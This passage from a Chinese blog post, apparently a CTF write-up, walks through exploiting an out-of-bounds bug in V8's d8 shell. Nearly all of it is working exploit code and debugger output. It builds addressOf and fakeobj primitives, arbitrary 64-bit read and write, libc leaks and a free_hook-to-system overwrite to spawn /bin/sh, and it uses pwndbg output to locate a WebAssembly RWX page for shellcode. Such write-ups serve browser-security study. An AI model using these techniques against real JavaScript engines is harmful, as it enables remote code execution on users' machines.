class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> d8_addr = read64(code_addr + <span class="number">0x41n</span>) - <span class="number">0x8424e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc d8_addr: 0x&quot;</span> + hex(d8_addr));</span><br><span class="line">got_printf = d8_addr + <span class="number">0xb073c8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] got_printf: 0x&quot;</span> + hex(got_printf));</span><br><span class="line">libc_base = read64(got_printf)- <span class="number">0x64f00n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc: 0x&quot;</span> + hex(libc_base));</span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line">system = libc_base + <span class="number">0x4f4e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook: 0x&quot;</span> + hex(free_hook));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] system: 0x&quot;</span> + hex(system));</span><br><span class="line">writeDataview(free_hook, system)</span><br><span class="line"><span class="keyword">var</span> shell_str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;/bin/sh\0&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure><h4 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h4><blockquote><p><strong>WebAssembly</strong>或称<strong>wasm</strong>是一个实验性的<a href="https://zh.wikipedia.org/wiki/%E4%BD%8E%E7%BA%A7%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80">低级编程语言</a>，应用于<a href="https://zh.wikipedia.org/wiki/%E7%80%8F%E8%A6%BD%E5%99%A8">浏览器</a>内的<a href="https://zh.wikipedia.org/wiki/%E5%AE%A2%E6%88%B6%E7%AB%AF">客户端</a>。WebAssembly是便携式的<a href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9">抽象语法树</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-1">1]</a>，被设计来提供比<a href="https://zh.wikipedia.org/wiki/JavaScript">JavaScript</a>更快速的<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91">编译</a>及运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-github.com-2">2]</a>。WebAssembly将让开发者能运用自己熟悉的编程语言（最初以<a href="https://zh.wikipedia.org/wiki/C%E8%AA%9E%E8%A8%80">C</a>/<a href="https://zh.wikipedia.org/wiki/C%2B%2B">C++</a>作为实现目标）编译，再藉虚拟机引擎在浏览器内运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-3">3]</a>。WebAssembly的开发团队分别来自<a href="https://zh.wikipedia.org/wiki/Mozilla%E5%9F%BA%E9%87%91%E6%9C%83">Mozilla</a>、<a href="https://zh.wikipedia.org/wiki/Google">Google</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E8%BB%9F">Microsoft</a>、<a href="https://zh.wikipedia.org/wiki/%E8%98%8B%E6%9E%9C%E5%85%AC%E5%8F%B8">Apple</a>，代表着四大网络浏览器<a href="https://zh.wikipedia.org/wiki/Firefox">Firefox</a>、<a href="https://zh.wikipedia.org/wiki/Google_Chrome">Chrome</a>、<a href="https://zh.wikipedia.org/wiki/Microsoft_Edge">Microsoft Edge</a>、<a href="https://zh.wikipedia.org/wiki/Safari">Safari</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-4">4]</a>。2017年11月，以上四个浏览器都开始实验性的支持WebAssembly[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-5">5]</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-6">6]</a>。WebAssembly 于 2019 年 12 月 5 日成为万维网联盟（W3C）的推荐，与 HTML，CSS 和 JavaScript 一起，成为 Web 的第四种语言。[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-7">7]</a>。</p></blockquote><p><a href="https://wasdk.github.io/WasmFiddle/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BA%BF%E5%B0%86C%E8%AF%AD%E8%A8%80%E7%9B%B4%E6%8E%A5%E8%BD%AC%E6%8D%A2%E4%B8%BAwasm%E5%B9%B6%E7%94%9F%E6%88%90JS%E9%85%8D%E5%A5%97%E8%B0%83%E7%94%A8%E4%BB%A3%E7%A0%81%E3%80%82">https://wasdk.github.io/WasmFiddle/，这个网站可以在线将C语言直接转换为wasm并生成JS配套调用代码。</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> d = f();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] return from wasm: &quot;</span> + d);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/v8/out.gn/x64.debug$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">[*] return from wasm: 42</span></span><br><span class="line"><span class="comment">Trace/breakpoint trap (core dumped)*/</span></span><br></pre></td></tr></table></figure><p>在<code>js</code>代码中加入<code>wasm</code>之后，程序中会存在一个<code>rwx</code>的段，我们可以把<code>shellcode</code>放到这个段里面，再跳过去执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*利用job命令查看函数结构对象，经过Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance等一系列调用关系，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">DebugPrint: 0x59fa561fab9: [Function] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x059fa5602109 &lt;JSFunction (sfi = 0xa1f9e548039)&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - function prototype: &lt;no-prototype-slot&gt;</span></span><br><span class="line"><span class="comment"> - shared_info: 0x059fa561fa81 &lt;SharedFunctionInfo 0&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - WASM instance 0x59fa561f8c1</span></span><br><span class="line"><span class="comment"> - WASM function index 0</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x0a1f9e5404b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #name: 0x0a1f9e540449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #arguments: 0x0a1f9e540369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #caller: 0x0a1f9e5403d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa81</span></span><br><span class="line"><span class="comment">0x59fa561fa81: [SharedFunctionInfo] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de5193409e1 &lt;Map[56]&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - function_map_index: 144</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - expected_nof_properties: 0</span></span><br><span class="line"><span class="comment"> - language_mode: sloppy</span></span><br><span class="line"><span class="comment"> - data: 0x059fa561fa59 &lt;WasmExportedFunctionData&gt;</span></span><br><span class="line"><span class="comment"> - code (from data): 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - function token position: -1</span></span><br><span class="line"><span class="comment"> - start position: -1</span></span><br><span class="line"><span class="comment"> - end position: -1</span></span><br><span class="line"><span class="comment"> - no debug info</span></span><br><span class="line"><span class="comment"> - scope info: 0x1de519340c61 &lt;ScopeInfo[0]&gt;</span></span><br><span class="line"><span class="comment"> - length: 0</span></span><br><span class="line"><span class="comment"> - feedback_metadata: 0x1de519342a39: [FeedbackMetadata]</span></span><br><span class="line"><span class="comment"> - map: 0x1de519341319 &lt;Map&gt;</span></span><br><span class="line"><span class="comment"> - slot_count: 0</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa59</span></span><br><span class="line"><span class="comment">0x59fa561fa59: [WasmExportedFunctionData] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de519345879 &lt;Map[40]&gt;</span></span><br><span class="line"><span class="comment"> - wrapper_code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - instance: 0x059fa561f8c1 &lt;Instance map = 0x3e43f7c49789&gt;</span></span><br><span class="line"><span class="comment"> - function_index: 0</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561f8c1</span></span><br><span class="line"><span class="comment">0x59fa561f8c1: [WasmInstanceObject] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x2aeb9878ac19 &lt;Object map = 0x3e43f7c4abd9&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - module_object: 0x2aeb9878e411 &lt;Module map = 0x3e43f7c491e9&gt;</span></span><br><span class="line"><span class="comment"> - exports_object: 0x2aeb9878e681 &lt;Object map = 0x3e43f7c4ad19&gt;</span></span><br><span class="line"><span class="comment"> - native_context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - memory_object: 0x059fa561f9e9 &lt;Memory map = 0x3e43f7c4a189&gt;</span></span><br><span class="line"><span class="comment"> - table 0: 0x2aeb9878e619 &lt;Table map = 0x3e43f7c49aa9&gt;</span></span><br><span class="line"><span class="comment"> - imported_function_refs: 0x1de519340c71 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - managed_native_allocations: 0x2aeb9878e5c1 &lt;Foreign&gt;</span></span><br><span class="line"><span class="comment"> - memory_start: 0x7f85c0d80000</span></span><br><span class="line"><span class="comment"> - memory_size: 65536</span></span><br><span class="line"><span class="comment"> - memory_mask: ffff</span></span><br><span class="line"><span class="comment"> - imported_function_targets: 0x561c5e8f7100</span></span><br><span class="line"><span class="comment"> - globals_start: (nil)</span></span><br><span class="line"><span class="comment"> - imported_mutable_globals: 0x561c5e8f8480</span></span><br><span class="line"><span class="comment"> - indirect_function_table_size: 0</span></span><br><span class="line"><span class="comment"> - indirect_function_table_sig_ids: (nil)</span></span><br><span class="line"><span class="comment"> - indirect_function_table_targets: (nil)</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;&#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x059fa561f8c1-1+0x88</span></span><br><span class="line"><span class="comment">00:0000│   0x59fa561f948 —▸ 0x1541e9fb6000 ◂— movabs r10, 0x1541e9fb6260 </span></span><br><span class="line"><span class="comment">01:0008│   0x59fa561f950 —▸ 0x2aeb9878e411 ◂— 0x7100003e43f7c491</span></span><br><span class="line"><span class="comment">02:0010│   0x59fa561f958 —▸ 0x2aeb9878e681 ◂— 0x7100003e43f7c4ad</span></span><br><span class="line"><span class="comment">03:0018│   0x59fa561f960 —▸ 0x59fa5601869 ◂— 0x1de519340f</span></span><br><span class="line"><span class="comment">04:0020│   0x59fa561f968 —▸ 0x59fa561f9e9 ◂— 0x7100003e43f7c4a1</span></span><br><span class="line"><span class="comment">05:0028│   0x59fa561f970 —▸ 0x1de5193404d1 ◂— 0x1de5193405</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">pwndbg&gt; vmmap 0x1541e9fb6000 #wasm code addr</span></span><br><span class="line"><span class="comment">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="comment">    0x1541e9fb6000     0x1541e9fb7000 rwxp     1000 0       +0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span 